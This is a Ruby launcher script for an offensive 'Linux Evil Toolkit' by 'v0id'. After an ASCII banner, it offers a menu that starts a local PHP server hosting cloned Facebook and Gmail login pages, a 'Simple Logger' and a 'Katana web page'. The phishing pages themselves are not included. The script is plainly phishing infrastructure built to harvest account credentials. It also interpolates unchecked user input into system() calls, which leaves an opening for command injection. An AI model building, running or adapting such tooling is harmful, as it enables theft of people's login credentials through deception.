#! /bin/ruby
#-------------------------------------------------------------
#
#                     Linux Evil Toolkit
# 
#                          By v0id
#
#
#-------------------------------------------------------------

require_relative './modules/colors.rb'

include Colors

puts "\n\n"
prYellow '  /$$$$$$                                                   '
prYellow ' /$$__  $$                                                  '
prYellow '| $$  \__/  /$$$$$$   /$$$$$$  /$$    /$$ /$$$$$$   /$$$$$$ '
prYellow '|  $$$$$$  /$$__  $$ /$$__  $$|  $$  /$$//$$__  $$ /$$__  $$'
prYellow ' \____  $$| $$$$$$$$| $$  \__/ \  $$/$$/| $$$$$$$$| $$  \__/'
prYellow ' /$$  \ $$| $$_____/| $$        \  $$$/ | $$_____/| $$      '
prYellow '|  $$$$$$/|  $$$$$$$| $$         \  $/  |  $$$$$$$| $$      '
prYellow ' \______/  \_______/|__/          \_/    \_______/|__/      '
prYellow '                                                            '
prYellow '                                                            '
prYellow '                                                            '
puts "\n\n"
prYellow "============================================================="
prYellow "[0] Exit"
prYellow "[1] Facebook login page"
prYellow "[2] Gmail login page"
prYellow "[3] Simple Logger"
prYellow "[4] Katana web page"
prYellow "============================================================="

PS1 = "\033[92m #{'[SimpleServer]::[LETK]$ '}\033[00m"
MSG = 'Set server ip:port: [127.0.0.1:8080]: '

print PS1; cmd = gets.chomp.to_s
print MSG; ip_port = gets.chomp.to_s
ip_port == '' ? ip_port = '127.0.0.1:8080': nil
case cmd
when '0'
	exit
when '1'
	system "cd ./pages/facebook.com && php -S #{ip_port}"
when '2'
	system "cd ./pages/gmail.com && php -S #{ip_port}"
when '3'
	system "cd ./pages/logger && php -S #{ip_port}"
when '4'
	system "cd ./pages/katana-web-kit && php -S #{ip_port}"
else 
	prRed '[COMMAND_ERROR]: Invalid'
	exit
end
puts "Server started at #{ip_port}"



			 	 			 	 